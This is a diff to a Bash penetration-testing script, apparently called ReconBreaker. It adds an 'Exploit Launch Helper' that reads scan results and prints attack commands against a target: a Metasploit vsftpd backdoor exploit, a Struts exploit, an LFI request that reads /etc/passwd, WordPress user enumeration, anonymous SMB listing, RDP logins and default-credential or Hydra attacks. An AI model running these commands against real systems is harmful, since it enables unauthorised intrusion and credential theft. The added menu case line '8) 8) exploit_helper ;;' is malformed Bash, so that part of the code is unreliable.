@@ -21,7 +21,7 @@ echo -e "${NC}"
 read -p "Enter target IP or domain: " TARGET
 
 # Create target structure
-mkdir -p "$TARGET"/{1_recon,2_scan,3_enum,4_attacks}
+mkdir -p "$TARGET"/{1_recon,2_scan,3_enum,4_attacks,5_creds/fuzz}
 
 # ------------ FASE 1: Passive Recon ------------
 passive_recon() {
@@ -165,8 +165,6 @@ nuclei_scan() {
         echo -e "${BLUE}[-] No HTTP service detected. Skipping Nuclei.${NC}"
     fi
 }
-
-
 # ------------ FASE 5: Fuzzing Users with Hydra ------------
 user_fuzzing() {
     echo -e "${YELLOW}[*] Starting user fuzzing on detected services...${NC}"
@@ -268,6 +266,90 @@ smart_auto_mode() {
     echo -e "${GREEN}[✔] SMART AUTO MODE completed for $TARGET${NC}"
 }
 
+# ------------ EXPLOIT LAUNCH HELPER ------------
+exploit_helper() {
+    echo -e "${YELLOW}[*] Starting Exploit Launch Helper for ${TARGET}${NC}"
+    echo -e "${BLUE}[*] Analyzing findings and suggesting possible exploits...${NC}"
+
+    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"
+    VULNERS_FILE="$TARGET/4_attacks/nmap_cve_match.txt"
+    SEARCHSPLOIT_FILE="$TARGET/4_attacks/searchsploit_results.txt"
+    NUCLEI_FILE="$TARGET/4_attacks/nuclei_results.txt"
+
+    # FTP exploits
+    if grep -q "vsftpd 2.3.4" "$SERVICE_FILE"; then
+        echo -e "${GREEN}[!] FTP: vsftpd 2.3.4 → Backdoor${NC}"
+        echo -e "    → msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run'"
+    fi
+
+    # Apache Struts
+    if grep -q "Apache Struts" "$VULNERS_FILE" || grep -qi "struts" "$NUCLEI_FILE"; then
+        echo -e "${GREEN}[!] Apache Struts detected → CVE-2017-5638${NC}"
+        echo -e "    → python3 exploit.py --url http://$TARGET"
+    fi
+
+    # LFI
+    if grep -qi "Local File Inclusion" "$NUCLEI_FILE"; then
+        echo -e "${GREEN}[!] LFI vulnerability found${NC}"
+        echo -e "    → curl http://$TARGET/index.php?page=../../../../etc/passwd"
+    fi
+
+    # RCE
+    if grep -qi "Remote Code Execution" "$NUCLEI_FILE"; then
+        echo -e "${GREEN}[!] Possible RCE detected via nuclei${NC}"
+        echo -e "    → Try command injection payloads manually"
+    fi
+
+    # Wordpress
+    if grep -qi "wordpress" "$TARGET/3_enum/web/whatweb.txt"; then
+        echo -e "${GREEN}[!] WordPress detected${NC}"
+        echo -e "    → wpscan --url http://$TARGET --enumerate u,vp,vt"
+    fi
+
+    # PHPMyAdmin
+    if grep -qi "phpmyadmin" "$TARGET/3_enum/web/whatweb.txt"; then
+        echo -e "${GREEN}[!] phpMyAdmin detected${NC}"
+        echo -e "    → Try default creds or SQL injection"
+    fi
+
+    # Joomla
+    if grep -qi "joomla" "$TARGET/3_enum/web/whatweb.txt"; then
+        echo -e "${GREEN}[!] Joomla detected${NC}"
+        echo -e "    → searchsploit joomla | tee -a $SEARCHSPLOIT_FILE"
+    fi
+
+    # SMB anonymous
+    if grep -qi "SMB" "$SERVICE_FILE" && grep -q "anonymous" "$TARGET/3_enum/smb/enum4linux.txt"; then
+        echo -e "${GREEN}[!] SMB allows anonymous access${NC}"
+        echo -e "    → smbclient -L \\$TARGET -N"
+    fi
+
+    # RDP weak auth
+    if grep -qi "ms-wbt-server" "$SERVICE_FILE"; then
+        echo -e "${GREEN}[!] RDP detected${NC}"
+        echo -e "    → xfreerdp /u:USER /p:PASS /v:$TARGET"
+    fi
+
+    # Default web admin panels
+    for panel in "admin" "login" "phpmyadmin" "webmin"; do
+        if grep -qi "$panel" "$TARGET/3_enum/web/gobuster_http.txt"; then
+            echo -e "${GREEN}[!] Web panel found: $panel${NC}"
+            echo -e "    → Try default creds or Hydra"
+        fi
+    done
+
+    # CVEs via vulners
+    if grep -q "CVE" "$VULNERS_FILE"; then
+        echo -e "${YELLOW}[*] CVEs found in vulners scan:${NC}"
+        grep "CVE" "$VULNERS_FILE" | cut -d ' ' -f 1 | sort -u | while read CVE; do
+            echo -e "    → $CVE → searchsploit $CVE"
+        done
+    fi
+
+    echo -e "${BLUE}[i] Also review manually: $SEARCHSPLOIT_FILE, $NUCLEI_FILE, $VULNERS_FILE${NC}"
+    echo -e "${GREEN}[✔] Exploit suggestions complete.${NC}"
+}
+
 
 
 # ------------ MAIN MENU LOOP ------------
@@ -282,6 +364,8 @@ while true; do
     echo "6. Run ALL phases"
     echo "----------------------------------"
     echo "7. Smart Auto Mode (recommended)"
+    echo "----------------------------------"
+    echo "8. Exploit Launch Helper (suggestions)"
     echo "----------------------------------"
     echo "0. Exit"
     read -p "Choice: " OPTION
@@ -300,6 +384,7 @@ while true; do
             auto_attacks
             ;;
         7) smart_auto_mode ;;
+        8) 8) exploit_helper ;;
         0)
             echo -e "${RED}Exiting ReconBreaker...${NC}"
             exit 0
